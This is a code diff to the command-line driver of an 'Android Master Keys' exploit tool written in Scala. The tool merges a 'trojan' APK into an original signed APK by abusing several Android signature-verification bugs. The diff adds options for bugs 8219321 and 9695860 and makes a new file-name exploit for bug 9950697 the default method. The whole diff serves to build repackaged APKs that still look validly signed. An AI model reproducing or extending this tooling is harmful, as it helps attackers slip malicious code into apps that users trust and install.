@@ -12,7 +12,9 @@ import android.master.keys.Config
 import scala.Some
 
 case class Config(origAPK:Option[File] = None,
+                  bug8219321:Boolean = false,
                   bug9695860:Boolean = false,
+                  bug9950697:Boolean = true,
                   mergeZip:Option[File] = None,
                   out:Option[File] = None,
                   files: Seq[File] = Seq())
@@ -20,14 +22,15 @@ case class Config(origAPK:Option[File] = None,
 object Main extends App {
 
   val parser = new scopt.OptionParser[Config]("Android Master Keys") {
-    head("Android Master Keys", "1.0")
+    head("Android Master Keys", "1.1")
     opt[File]('a', "apk") required() valueName("<file>") action { (x, c) =>
       c.copy(origAPK = Some(x)) } text("path to original APK")
     opt[File]('z', "zip") valueName("<zipFile>") action { (x, c) =>
       c.copy(mergeZip = Some(x)) } text("Merge files from this zip into original APK")
     opt[File]('o', "out") valueName("<file>") action { (x, c) =>
       c.copy(out = Some(x)) } text("output APK path")
-    opt[Unit]('b',"9695860") optional() action {(x,c) => c.copy(bug9695860 = true)} text("Use bug 9695860")
+    opt[Unit]("8219321") optional() action {(x,c) => c.copy(bug8219321 = true)} text("Use bug 8219321 (uses 9950697 by default)")
+    opt[Unit]("9695860") optional() action {(x,c) => c.copy(bug9695860 = true)} text("Use bug 9695860 (uses 9950697 by default)")
     arg[File]("<file>...") unbounded() optional() action { (x, c) =>
       c.copy(files = c.files :+ x) } text("Files to merge into zip")
     help("help") text("prints this usage text")
@@ -60,7 +63,10 @@ object Main extends App {
 
      val fileBytes =
       if(config.bug9695860) ogAPK.centralDirectoryOverlap(trojanAPK).getZipFileBytes
-      else ogAPK.hashNormalizedMerge(trojanAPK).getZipFileBytes
+      else if(config.bug8219321) ogAPK.hashNormalizedMerge(trojanAPK).getZipFileBytes
+      else { //Bug 9950697
+           ogAPK.AndroidFileNameExploit(trojanAPK).getZipFileBytes
+      }
 
      writeFile(outFilePath, fileBytes)
    }
